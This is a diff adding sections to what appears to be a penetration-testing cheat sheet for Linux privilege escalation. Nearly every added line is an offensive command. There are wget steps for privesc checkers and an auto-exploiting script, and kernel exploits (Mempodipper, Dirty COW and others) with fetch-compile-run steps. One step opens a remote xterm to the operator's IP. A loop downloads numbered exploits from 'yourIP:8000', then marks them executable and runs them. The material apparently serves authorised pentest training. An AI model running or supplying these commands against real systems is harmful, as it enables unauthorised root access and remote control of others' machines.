@@ -255,6 +255,89 @@ Inspect web traffic
 
 > $ tcpdump tcp port 80 -w output.pcap -i eth0
 
+## Scripts to run
+
+The following script runs exploit suggester and automatically downloads and executes suggested exploits:
+
+> https://raw.githubusercontent.com/codingo/OSCP-1/master/xploitdeli.py
+
+> wget http://www.securitysift.com/download/linuxprivchecker.py
+
+> wget https://github.com/pentestmonkey/unix-privesc-check
+
+Other scripts:
+
+> wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
+
+> wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+
+> wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
+
+> wget https://raw.githubusercontent.com/PenturaLabs/Linux_Exploit_Suggester/master/Linux_Exploit_Suggester.pl
+
+> wget  https://www.rebootuser.com/?p=1758
+
+## Exploits worth running
+
+CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8
+
+> https://www.exploit-db.com/exploits/15285/
+
+Linux Kernel <= 2.6.37 'Full-Nelson.c'
+
+https://www.exploit-db.com/exploits/15704/
+
+CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)
+
+> https://git.zx2c4.com/CVE-2012-0056/about/
+
+Linux CVE 2012-0056
+
+> get -O exploit.c <http://www.exploit-db.com/download/18411>
+>  gcc -o mempodipper exploit.c
+>  ./mempodipper
+
+CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
+
+> https://dirtycow.ninja/
+
+Compile dirty cow:
+
+ > g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
+
+Cross compiling exploits
+
+> $ gcc -m32 -o output32 hello.c #(32 bit)
+> $  gcc -m64 -o output hello.c # (64 bit)
+
+Linux 2.6.32
+
+> https://www.exploit-db.com/exploits/15285/
+
+## Open an xterm remotely
+
+First, run an xserver in your machine
+
+> $ Xnest :1
+
+Then, bind it to xterm, again in your machine:
+
+> $ xterm -display 127.0.0.1:1
+
+Finally, run the follwing in the remote machine:
+
+> $ /usr/openwin/bin/xterm -display yourip:1
+
+## Get proof
+
+> $ echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a;echo " ";echo "proof:";cat /root/proof.txt 2>/dev/null; cat /Desktop/proof.txt 2>/dev/null;echo " "
+
+## Elevation in 2.6.x:
+
+> $ for a in 9352 9513 33321 15774 15150 15944 9543 33322 9545 25288 40838 40616 40611 ; do wget http://yourIP:8000/$a; chmod +x $a; ./$a; id; done
+
+
+
 
 
 
